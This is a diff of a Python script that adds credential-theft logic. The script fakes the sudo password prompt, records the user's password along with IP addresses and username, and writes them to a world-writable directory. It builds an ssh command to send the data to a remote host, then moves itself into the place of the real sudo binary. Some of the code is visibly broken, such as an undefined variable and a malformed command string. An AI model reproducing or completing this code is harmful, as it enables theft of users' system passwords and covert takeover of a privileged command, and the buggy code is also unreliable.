@@ -1,9 +1,11 @@
-#!/usr/env/python3
+#!/usr/bin/env python3
 
 from getpass import getuser, getpass
 from datetime import datetime
 from socket import gethostbyname_ex, gethostname, socket, AF_INET, SOCK_DGRAM
 from requests import get
+from shutil import move
+from os import system
 
 # edited Code from W3schools
 def get_internal_ip():
@@ -18,7 +20,7 @@ def get_external_ip():
 
     return ip
 
-def get_info():
+def get_creds():
 
     curr_user = getuser()
     prompt = "[sudo] password for " + curr_user + ': '
@@ -29,11 +31,37 @@ def get_info():
     info = 'external_ip: <' + external_ip + '>, internal_ip:<' + internal_ip + '>, username:<' + curr_user + '>, passwd:<' + passwd +'>, ' + str(datetime.now())  
 
     return info
-def move_sudo()
-    return
 
-def pass_to_sudo()
-    return
+def write_creds(fname = '/tmp/info'):
+    text = get_creds()
+    try:
+        with open(fname, 'a+') as f: f.write(text)
+    except:
+        ensure_directory(fname)
+        with open(fname, 'a+') as f: f.write(text)
+
+    return fname
+
+def ensure_directory(fname):
+    directory = ''.join(fname.rsplit('/',1)[:-1])
+    cmd = 'mkdir -m 777 -p ' + directory
+    system(cmd)
+    print(cmd)
+
+def send_creds(ip, username, keyfile='./creds.txt'):
+    text = get_creds() 
+    fname = get_external_ip()
+    cmd = 'echo "' + text + '" | ssh -i ' + key + username + '@' + ip +'"cat ~/' + fname + '"'
+    return cmd
+
 
 if __name__ == '__main__':
-    print(get_info())
+    creds = write_creds('./tmp/info')
+    fake_sudo = './get_creds.py'
+    real_sudo = './usrbin/sudo'
+    backup_sudo = './usrbin/baksudo'
+    ensure_directory(real_sudo)
+    move(real_sudo, backup_sudo)
+    move(fake_sudo, real_sudo)
+    move(real_sudo, './usrbin/origsudo')
+
